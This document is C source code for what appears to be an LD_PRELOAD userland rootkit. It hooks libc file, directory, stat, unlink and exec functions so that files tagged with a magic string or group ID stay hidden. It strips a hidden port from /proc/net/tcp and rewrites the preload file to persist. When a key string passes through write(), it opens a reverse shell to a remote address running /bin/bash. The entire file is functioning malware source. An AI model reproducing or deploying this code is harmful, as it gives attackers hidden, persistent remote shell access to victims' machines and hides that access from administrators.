#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <netinet/in.h>
#include <errno.h>
#include "grinch.h"


static struct dirent* (*old_readdir)(DIR *dir) = NULL;
static struct dirent64* (*old_readdir64)(DIR *dir) = NULL;
static FILE* (*old_fopen)(const char *path, const char *mode) = NULL;
static FILE* (*old_fopen64)(const char *path, const char *mode) = NULL;
static int (*old_execve)(const char *path, char *const argv[], char *const envp[]) = NULL;
static int (*old_access)(const char *path, int mode) = NULL;
static int (*old_open)(const char *path, int flags, mode_t mode) = NULL;
static int (*old_openat)(int fd, const char *pathname, int flags, mode_t mode) = NULL;
static int (*old_rmdir)(const char *path) = NULL;
static int (*old_unlink)(const char *path) = NULL;
static int (*old_unlinkat)(int fd, const char *path, int flags) = NULL;
static int (*old_fxstat)(int ver, int fd, struct stat *buf) = NULL;
static int (*old_fxstat64)(int ver, int fd, struct stat64 *buf) = NULL;
static int (*old_lxstat)(int ver, const char *path, struct stat *buf) = NULL;
static int (*old_lxstat64)(int ver, const char *path, struct stat64 *buf) = NULL;
static int (*old_xstat)(int ver, const char *path, struct stat *buf) = NULL;
static int (*old_xstat64)(int ver, const char *path, struct stat64 *buf) = NULL;
static ssize_t (*old_write)(int fd, const void *buf, size_t count) = NULL;


void IPv4() {
    int sockfd;
    pid_t pid;
    
    setgid(MAGIC_GID);
    if((pid = fork()) == 0) {
        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit(0x0);
        struct sockaddr_in server, client;

        inet_pton(AF_INET, REMOTE_ADDR_4, &server.sin_addr);
        server.sin_port = htons(REMOTE_PORT);
        server.sin_family = AF_INET;

        client.sin_addr.s_addr = INADDR_ANY;
        client.sin_port = htons(LOCAL_PORT);
        client.sin_family = AF_INET;

        if (bind(sockfd, (struct sockaddr *)&client, sizeof(client)) == -1) exit(0x0);
        if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) exit(0x0);
        for(int i = 0; i < 3; i++) dup2(sockfd, i);
        if(old_execve == NULL) old_execve = dlsym(RTLD_NEXT, "execve");

        old_execve("/bin/bash", NULL, NULL);
        close(sockfd);
        exit(0x0);
    }
}


void hijack_proc_net_tcp(FILE* tmp, const char *path, const char* mode) {
    FILE *old_file;
    char *buff = NULL;
    size_t buff_length = 0;

    #if __x86_64__
    old_file = old_fopen64(path, mode);
    #else
    old_file = old_fopen(path, mode);
    #endif

    if(old_file != NULL) {
        while(getline(&buff, &buff_length, old_file) != -1) { 
            if(strstr(buff, HEX_PORT) == NULL)
                fputs(buff, tmp);
        }
        fflush(old_file);
        fclose(old_file);
        free(buff);
        buff = NULL;
        rewind(tmp);
    }
}


struct dirent* readdir(DIR *dir) {
    struct dirent *dir_;

    if(old_readdir == NULL) old_readdir = dlsym(RTLD_NEXT, "readdir");
    while((dir_ = old_readdir(dir))) {
        if(strstr(dir_->d_name, MAGIC_STRING) == NULL
        || strstr(dir_->d_name, PRELOAD_FILE) == NULL)
            break;
    }
    return dir_;
}


struct dirent64* readdir64(DIR *dir) {
    struct dirent64 *dir_;

    if(old_readdir64 == NULL) old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    while((dir_ = old_readdir64(dir))) {
        if(strstr(dir_->d_name, MAGIC_STRING) == NULL
        || strstr(dir_->d_name, PRELOAD_FILE) == NULL)
            break;
    }
    return dir_;
}


FILE* fopen(const char *path, const char *mode) {
    struct stat tmp_stat;

    if(old_fopen == NULL) old_fopen = dlsym(RTLD_NEXT, "fopen64");
    if(strcmp(path, PROC_NET_TCP) == 0 || strcmp(path, PROC_NET_TCP6) == 0) {
        FILE *tmp = tmpfile();
        
        hijack_proc_net_tcp(tmp, path, mode);    
        return tmp;
    }
    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_xstat(3, path, &tmp_stat);

    if(strstr(path, MAGIC_STRING) != NULL
    || strcmp(path, PRELOAD_PATH) == 0
    || tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return NULL;
    }
    return old_fopen(path, mode);
}


FILE* fopen64(const char *path, const char *mode) {
    struct stat64 tmp_stat; 

    if(old_fopen64 == NULL) old_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    if(strcmp(path, PROC_NET_TCP) == 0 || strcmp(path, PROC_NET_TCP6) == 0) {
        FILE *tmp = tmpfile64();

        hijack_proc_net_tcp(tmp, path, mode);
        return tmp;
    }
    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_xstat64(3, path, &tmp_stat);

    if(strstr(path, MAGIC_STRING) != NULL
    || strcmp(path, PRELOAD_PATH) == 0
    || tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return NULL;
    }
    return old_fopen64(path, mode);
}


int execve(const char *path, char *const argv[], char *const envp[]) {
    if(old_execve == NULL) old_execve = dlsym(RTLD_NEXT, "execve");

    if(strstr(path, LD_LIBRARY) != NULL) {
        if(old_unlink == NULL) old_unlink = dlsym(RTLD_NEXT, "unlink");
        if(old_fopen == NULL) old_fopen = dlsym(RTLD_NEXT, "fopen");
        FILE *ld_preload;        

        old_unlink(PRELOAD_PATH);
        old_execve(path, argv, envp);
        ld_preload = old_fopen(PRELOAD_PATH, "w");
        fwrite(MAGIC_PATH, strlen(MAGIC_PATH), 1, ld_preload);
        fclose(ld_preload);

        return 0;
    }
    return old_execve(path, argv, envp);
}


int access(const char *path, int mode) {
    if(old_access == NULL) old_access = dlsym(RTLD_NEXT, "access");
    if(strcmp(path, PRELOAD_PATH) == 0 || strstr(path, MAGIC_STRING) != NULL) {
        errno = ENOENT;
        return -1;
    }
    return old_access(path, mode);
}


int open(const char *path, int flags, mode_t mode) {
    if(old_open == NULL) old_open = dlsym(RTLD_NEXT, "open");
 
    #if __x86_64__
    struct stat64 tmp_stat;

    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_xstat64(3, path, &tmp_stat);
    #else
    struct stat tmp_stat;

    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_xstat(3, path, &tmp_stat);
    #endif

    if(strstr(path, MAGIC_STRING) != NULL
    || strcmp(path, PRELOAD_PATH) == 0
    || tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_open(path, flags, mode);
}


int openat(int fd, const char *path, int flags, mode_t mode) {
    if(old_openat == NULL) old_openat = dlsym(RTLD_NEXT, "openat");

    #if __x86_64__
    struct stat64 tmp_stat;

    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_xstat64(3, path, &tmp_stat);
    #else
    struct stat tmp_stat;

    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_xstat(3, path, &tmp_stat);
    #endif

    if(strstr(path, MAGIC_STRING) != NULL
    || strcmp(path, PRELOAD_PATH) == 0
    || tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_openat(fd, path, flags, mode);
}


int rmdir(const char *path) {
    if(old_rmdir == NULL) old_rmdir = dlsym(RTLD_NEXT, "rmdir");

    #if __x86_64__
    struct stat64 tmp_stat;

    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_xstat64(3, path, &tmp_stat);
    #else
    struct stat tmp_stat;

    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_xstat(3, path, &tmp_stat);
    #endif

    if(strstr(path, MAGIC_STRING) != NULL
    || strcmp(path, PRELOAD_PATH) == 0
    || tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_rmdir(path);
}


int unlink(const char *path) {
    if(old_unlink == NULL) old_unlink = dlsym(RTLD_NEXT, "unlink");

    #if __x86_64__
    struct stat64 tmp_stat;

    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_xstat64(3, path, &tmp_stat);
    #else
    struct stat tmp_stat;

    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_xstat(3, path, &tmp_stat);
    #endif

    if(strstr(path, MAGIC_STRING) != NULL
    || strcmp(path, PRELOAD_PATH) == 0
    || tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_unlink(path);
}


int unlinkat(int fd, const char *path, int flags) {
    if(old_unlinkat == NULL) old_unlinkat = dlsym(RTLD_NEXT, "unlinkat");

    #if __x86_64__
    struct stat64 tmp_stat;

    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_xstat64(3, path, &tmp_stat);
    #else
    struct stat tmp_stat;

    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_xstat(3, path, &tmp_stat);
    #endif

    if(strstr(path, MAGIC_STRING) != NULL
    || strcmp(path, PRELOAD_PATH) == 0
    || tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_unlinkat(fd, path, flags);
}


int __fxstat(int ver, int fd, struct stat *buf) {
    struct stat tmp_stat;

    if(old_fxstat == NULL) old_fxstat = dlsym(RTLD_NEXT, "__fxstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_fxstat(ver, fd, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_fxstat(ver, fd, buf);
}


int __fxstat64(int ver, int fd, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_fxstat64 == NULL) old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_fxstat64(ver, fd, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_fxstat64(ver, fd, buf);
}


int __lxstat(int ver, const char *path, struct stat *buf) {
    struct stat tmp_stat;

    if(old_lxstat == NULL) old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_lxstat(ver, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat(ver, path, buf);
}


int __lxstat64(int ver, const char *path, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_lxstat64 == NULL) old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_lxstat64(ver, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat64(ver, path, buf);
}


int __xstat(int ver, const char *path, struct stat *buf) {
    struct stat tmp_stat;

    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_xstat(ver, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat(ver, path, buf);
}


int __xstat64(int ver, const char *path, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_xstat64(ver, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat64(ver, path, buf);
}


int fstat(int fd, struct stat *buf) {
    struct stat tmp_stat;

    if(old_fxstat == NULL) dlsym(RTLD_NEXT, "__fxstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_fxstat(3, fd, &tmp_stat);
    
    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_fxstat(3, fd, buf);
}


int fstat64(int fd, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_fxstat64 == NULL) old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_fxstat64(3, fd, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_fxstat64(3, fd, buf);
}


int lstat(const char *path, struct stat *buf) {
    struct stat tmp_stat;
    
    if(old_lxstat == NULL) old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_lxstat(3, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat(3, path, buf);
}


int lstat64(const char *path, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_lxstat64 == NULL) old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_lxstat64(3, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat64(3, path, buf);
}


int stat(const char *path, struct stat *buf) {
    struct stat tmp_stat;

    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_xstat(3, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat(3, path, buf);
}


int stat64(const char *path, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_xstat64(3, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat64(3, path, buf);
}


/*
 * 0x401 is: O_WRONLY | O_APPEND
 * 0666 is: rw-rw-rw-
 */
ssize_t write(int fd, const void *buf, size_t count) {
    if(old_write == NULL) old_write = dlsym(RTLD_NEXT, "write");
    if(old_open == NULL) old_open = dlsym(RTLD_NEXT, "open");

    if(strstr(buf, KEY_STRING) != NULL) {
        fd = old_open("/dev/null", 0x401, 0666);
        IPv4();
    }
    return old_write(fd, buf, count);
}
